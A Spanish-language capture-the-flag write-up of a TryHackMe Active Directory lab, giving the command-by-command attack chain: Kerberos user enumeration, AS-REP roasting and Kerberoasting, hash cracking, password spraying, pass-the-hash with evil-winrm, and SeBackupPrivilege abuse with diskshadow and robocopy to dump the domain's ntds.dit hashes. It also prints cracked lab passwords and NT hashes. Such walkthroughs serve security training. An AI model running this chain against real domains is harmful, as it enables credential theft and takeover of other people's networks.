Realizamos un escaneo sencillo para enumerar los puertos
![[Pasted image 20240726113309.png]]

Y ahora hacemos uno mas completo
![[Pasted image 20240726102313.png]]
![[Pasted image 20240726102336.png]]

Añadimos los nombres del dominio a nuestro `hosts`
![[Pasted image 20240726102514.png]]

Comenzamos enumerando el protocolo de kerberos para descubrir usuarios pero no tenemos exito y solo nos encuentra el usuario Administrador
![[Pasted image 20240726105708.png]]

Ahora pasamos a enumerar el servicio RPC Y NFS para ello usaremos `rpcinfo` 
```
rpcinfo -p 10.10.63.23
```
![[Pasted image 20240726113556.png]]

Encontramos que hay un directorio compartido el cual tiene los permisos que cualquiera puede acceder
```
showmount -e 10.10.92.58
```
![[Pasted image 20240726111742.png]]

Creamos una carpeta y lo montamos en nuestro sistema
![[Pasted image 20240726124648.png]]

Listamos la carpeta y encontramos los siguientes ficheros
![[Pasted image 20240726124746.png]]

Nos enviamos el archivo a nuestra carpeta
![[Pasted image 20240726130055.png]]

Ahora lo pasamos a csv con ssconvert
```
sudo ssconvert employee_status.xlsx employee.csv
```
![[Pasted image 20240726130223.png]]

Si nos fijamos en el otro documento de texto el nombre es la primera letra nombre y el apellido, así que lo modificamos
![[Pasted image 20240726130911.png]]

Si ahora volvemos a probar con kerbrute obtenemos mas usuarios del sistema y obtenemos el hash de uno de los usuarios
```
kerbrute userenum --dc 10.10.73.196 -d raz0rblack.thm users.txt
```
![[Pasted image 20240726130956.png]]

En este punto podemos usar la herramienta `GetNPUsers` y obtener el hash de la contraseña del usuario
```
GetNPUsers.py raz0rblack.thm/twilliams -no-pass
```
![[Pasted image 20240726132127.png]]

Ahora pasaremos este hash por John the Ripper para obtener la password del usuario, para ello copiamos toda la salida y la pegamos en un .txt
![[Pasted image 20240726132307.png]]

Y obtenemos las credenciales de twilliams
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![[Pasted image 20240726132353.png]]

Este es el usuario
```
twilliams
roastpotatoes
```

Ahora con smbmap enumeramos los archivos compartidos
```
smbmap -H 10.10.73.196 -u "twilliams" -p "roastpotatoes"
```
![[Pasted image 20240726133028.png]]

Ahora nos conectamos con rpcclient y obtenemos los usuarios del sistema
```
rpcclient -U "twilliams" 10.10.199.105
```
![[Pasted image 20240730082503.png]]

Con los usuarios validados realizaremos un `Password Spraying` con Kerbrute reutilizando la password del usuario twilliams, como podemos ver encontramos que el usuario `sbradley` el cual la password a caducado
```
kerbrute passwordspray -d raz0rblack.thm --dc 10.10.199.105 users.txt roastpotatoes
```
![[Pasted image 20240730085023.png]]

Ahora utilizaremos la herramienta `smbpasswd` para cambiar la contraseña del usuario `sbradley`, podemos ver que nos da error
```
smbpasswd -r 10.10.209.141 -U sbradley
```
![[Pasted image 20240730125539.png]]

Por alguna razon ejecutamos el debugger y sigue dando error
```
smbpasswd -r 10.10.209.141 -U sbradley -D 5
```
![[Pasted image 20240731072938.png]]
- `-D`: Habilitamos el modo debugger con un nivel alto

Como no ha funcionado utilizaremos otra forma para cambiar la password, en este caso hemos utilizado la herramienta `impacket-smbpasswd`
```
impacket-smbpasswd sbradley@10.10.120.238
```
![[Pasted image 20240731073213.png]]

Lo verificamos con crackmapexec y vemos que ahora si que hemos podido cambiar la password
![[Pasted image 20240731073344.png]]

Ahora enumeramos los permisos que tiene el sigueinte usuario y las carpetas a las cuales podemos acceder y encontramos que tenemos permisos para una carpeta mas
![[Pasted image 20240731074936.png]]

Accedemos por smbclient y nos descargamos los ficheros de trash
![[Pasted image 20240731080352.png]]

Revisando los fichero descargados tenemos un total de 3 archivos, la flag de sbradley, un archivo compridio zip con password
![[Pasted image 20240731081119.png]]

Y dentro del fichero del chat tenemos una conversación la cual menciona que se ha extraido dos ficheros a raiz de una vulnerabilidad conocidad como `ZeroLogon` el cual extrae los ficheros de `ntds.dit` y `SYSTEM.hive`
![[Pasted image 20240731081058.png]]
- `ntds.dit`: Este archivo es la base de datos del Active Directory en un servidor de Windows. Active Directory (AD) es un directorio que contiene información sobre los objetos del entorno de red y ofrece servicios de directorio, como autenticación y autorización. El archivo `ntds.dit` específicamente almacena toda la información acerca de las cuentas de usuario, incluyendo contraseñas (en forma de hash), políticas de grupo, relaciones de confianza de dominio y otros datos relacionados con la seguridad. Este archivo se encuentra en `%SystemRoot%\NTDS`.
- `SYSTEM.hive`: Este archivo es parte del Registro de Windows y contiene la configuración del sistema operativo y de software que no es específica del usuario. En el contexto de un servidor de Windows, `SYSTEM.hive` incluye configuraciones críticas del sistema y, a menudo, puede contener claves de seguridad y otros parámetros vitales que ayudan a controlar el comportamiento del sistema operativo. Este archivo se encuentra en `%SystemRoot%\System32\Config`.

Ahora utilizaremos John the ripper para crackear la password, para ello primero convertiremos el zip en un hash
```
zip2john experiment_gone_wrong.zip > ziphash.txt
```
![[Pasted image 20240731082129.png]]

Y ahora con john obtenemos la password
```
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
```
![[Pasted image 20240731082233.png]]

Lo probamos y descomprimimos el fichero, como podemos ver obtenemos los dos ficheros mencionados antes extraidos de la vulnerabilidad
![[Pasted image 20240731082307.png]]

Ahora con `secretdump.py`  extraemos toda la información de los dos ficheros y obtenemos los hashes de los usuarios
```
secretsdump.py -system system.hive -ntds ntds.dit LOCAL | tee hashdump.txt
```
![[Pasted image 20240731091458.png]]

Ahora extreaeremos todos los hash NT, accedemos al fichero y recortamos los campos vacios para que unicamente queden los hashes
```
cat hashdump.txt | cut -d':' -f4 | tee final_hash.txt
```
![[Pasted image 20240731092505.png]]

Ahora probaremos con los usuarios los hasehs obtenidos de los ficheros
```
crackmapexec smb 10.10.25.146 -u lvetrova -H final_hash.txt
```
![[Pasted image 20240731112953.png]]
![[Pasted image 20240731113130.png]]

Ahora podemos usar la herramienta `evil-winrm` para acceder con el hash
```
evil-winrm -i 10.10.25.146 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
```
![[Pasted image 20240731113344.png]]

Si leemos el fichero nos encontramos que este encriptado con powershell, podemos desencriptarlo con powershell con el mismo usuario que lo haya encriptado
```
Get-Content lvetrova.xml
```
![[Pasted image 20240731114941.png]]

Para ello ejecutaremos los dos siguiente comandos
```
$credentials = Import-Clixml -Path .\lvetrova.xml
$credentials.GetNetworkCredential().password
```
![[Pasted image 20240731115032.png]]

Ahora realizaremos un ataque de Kerberoasting con `GetUserSPNs`
```
GetUserSPNs.py -dc-ip 10.10.25.146 raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d
```
![[Pasted image 20240731115759.png]]

Ahora que sabemos que existe una cuenta podemos obtener el TGT
```
GetUserSPNs.py -dc-ip 10.10.25.146 raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -request
```
![[Pasted image 20240731120040.png]]

Ahora que tenemos el hash lo podemos crackear con John
![[Pasted image 20240731120243.png]]

Probamos las credenciales y ya estamos dentro del usuario
```
evil-winrm -i 10.10.25.146 -u xyan1d3 -p cyanide9amine5628
```
![[Pasted image 20240731120434.png]]

Dentro nos encontramos con el siguiente fichero
![[Pasted image 20240731120610.png]]

Volvemos a ejecutar los dos comandos para desencriptarlo
```
$credentials = Import-Clixml -Path .\xyan1d3.xml
$credentials.GetNetworkCredential().password
```
![[Pasted image 20240731120812.png]]

# Escalada de privilegios
Ahora nos encontramos que tenemos los permisos de `SeBackupPrivilage` en la cual tenemos el siguiente articulo que explica bien como explotarla
```
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
```
![[Pasted image 20240731121802.png]]
- `SeBackupPrivilege`:  Proporciona a los usuarios permisos de lectura completos y la capacidad de crear copias de seguridad del sistema. El acceso de lectura completo permite leer cualquier archivo del objetivo, incluidos los archivos sensibles del sistema como _SAM_, _SYSTEM_ o _NTDS.dit_. Un potencial atacante puede aprovechar este privilegio para extraer los _hashes_ de estos archivos sensibles, descifrarlos o pasarlos (PTH) para elevar su shell.

Para empezar la escalada de privilegios comenzaremos creando el siguiente script
```Powershell
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
![[Pasted image 20240731125129.png]]

Ahora enviamos el script a la maquina victima
![[Pasted image 20240731125356.png]]

Ahora lo ejecutamos con la utilidad `diskshadows`
```
diskshadow /s script.txt
```
![[Pasted image 20240731125643.png]]
![[Pasted image 20240731125659.png]]

Al finalizar se nos creara una unidad adicional
![[Pasted image 20240731125738.png]]

Ahora con la utilidad `robocopy` realizaremos una copia del fichero `NTDS.dit`
```
robocopy /b E:\Windows\ntds . ntds.dit
```
![[Pasted image 20240731130026.png]]
![[Pasted image 20240731130039.png]]

Una vez finalice seguiremos generando un respaldo del registro `SYSTEM`, nos valdra para conseguir descifrar el fichero `NTDS.dit`
```
reg save hklm\system .\system.copy
```
![[Pasted image 20240731130227.png]]

Ahora traemos estos dos ficheros a nuestro equipo para extraer los hashes de todos los usuarios
![[Pasted image 20240731130340.png]]
![[Pasted image 20240731131837.png]]

Ejecutamos `secretsdump` y obtendremos todos los hashes del sistema
```
impacket-secretsdump -system system.copy -ntds ntds.dit local
```
![[Pasted image 20240731133716.png]]

Ahora si probamos ha acceder con el usuario Administrator ya habremos escalado los privilegios
```
evil-winrm -i 10.10.56.42 -u Administrator -H 9689931bed40ca5a2ce1218210177f0c
```
![[Pasted image 20240731133846.png]]


Flag de root
```
Get-Content root.xml
```
![[Pasted image 20240731134011.png]]

Como es un hash hexadecimal lo leeremos ejecutando el siguiente comando
```Bash
echo "44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a" | xxd -r -p
```
![[Pasted image 20240731134351.png]]

Flag de Tyson
![[Pasted image 20240731134611.png]]

Para buscar la flag secreta ejecutaremos el siguiente comando para buscar todo tipo de ficheros y directorios que contengas `secret`
```
ls C:\ *secret* -Recurse
```
![[Pasted image 20240731134836.png]]

Nos descargamos la imagen
![[Pasted image 20240731135212.png]]

Y al leerla nos indica la flag
```
:wq
```
![[Pasted image 20240731135229.png]]
